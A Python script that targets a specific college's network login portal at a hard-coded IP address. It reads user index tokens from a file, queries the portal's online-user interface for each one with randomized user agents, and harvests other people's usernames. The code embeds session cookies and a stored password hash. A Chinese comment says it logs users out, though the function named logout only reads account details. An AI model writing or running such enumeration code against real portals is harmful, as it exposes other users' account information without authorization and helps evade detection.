import requests
from fake_useragent import UserAgent
from requests.adapters import HTTPAdapter

ua = UserAgent()

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 Edg/112.0.1722.48",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "Accept": "*/*",
    "Origin": "http://111.7.172.99:8246",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6"
}

cookies = {
    "EPORTAL_COOKIE_USERNAME": "1883719****",
    "EPORTAL_COOKIE_DOMAIN": "false",
    "EPORTAL_COOKIE_SAVEPASSWORD": "true",
    "EPORTAL_COOKIE_OPERATORPWD": "",
    "EPORTAL_COOKIE_NEWV": "true",
    "EPORTAL_COOKIE_PASSWORD": "77af4f1175dbec4bc4a2b5569cc89b35d773141bb81e06cf655c9a7be4c1a0e8f6433def07f6154e6419256a778bfb0a51cb31f1ca41ab23f32371c398fd304cf9bad946cb7766f802d32ad9cd2005a62457a9a121da94e23097c66f6f8b864424f82531ea1a5fd88e42785d3dbae72e5410f31cc19888bc2f83b3d09bd48a21",
    "EPORTAL_AUTO_LAND": "",
    "EPORTAL_COOKIE_SERVER": "internet",
    "EPORTAL_COOKIE_SERVER_NAME": "%E4%BA%92%E8%81%94%E7%BD%91",
    "EPORTAL_USER_GROUP": "%E6%B2%B3%E5%8D%97%E4%BF%A1%E6%81%AF%E7%BB%9F%E8%AE%A1%E8%81%8C%E4%B8%9A%E5%AD%A6%E9%99%A2%E7%99%BD%E6%B2%99%E6%A0%A1%E5%8C%BA",
    "JSESSIONID": "B92AA8C2472C05DAA816A9F49F1A4F04",
    "JSESSIONID": "85B5CBC9496DAEB65DCF731FAD82BF43"
}

data = {
    "JSON": "userIndex"
}
status = 0

userList = ''


def logout(uid, status,userList):
    data['userIndex'] = uid
    headers['referer'] = f"http://111.7.172.99:8246/eportal/success.jsp?userIndex={uid}&keepaliveInterval=0"
    url = f'http://111.7.172.99:8246/eportal/InterFace.do?method=getOnlineUserInfo&param=value&userIndex={uid}&JSON=userIndex&another_param=another_value'
    requests.DEFAULT_RETRIES = 100
    s = requests.session()
    s.mount('http://', HTTPAdapter(max_retries=3))

    s.keep_alive = False
    headers['User-Agent'] = ua.random
    try:
        response = requests.post(url, data=data, headers=headers, verify=False)
        s.close()
        response.close()
        response.encoding = 'utf-8'
        # print(response.text)
        # print(response.json()['userName'])

        userName = response.json()['userName']
        if userName:
            if userName not in userList:
                userList += userName + ','
            print(userList)
            status += 1
        print(response.json()['userName'])
    except:
        return None, None, status
    return url, status,userList


# 遍历获取文件简单获取文件信息.txt中每行的Index=到下一个=截至的值，然后调用logout函数，退出登录


with open('简单获取用户信息.txt', 'r') as f:
    for line in f.readlines():
        uid1 = line.split('Index=')[1].strip()

        # 从uid中删除&JSON=userIndex&another_param=another_value
        uid = uid1.split('&')[0]
        # print(uid)
        uid, status,userList = logout(uid, status,userList)
        print(status)
import winsound
winsound.Beep(600, 200)
# with open('userList.txt','w') as f:
#     f.write(userList)
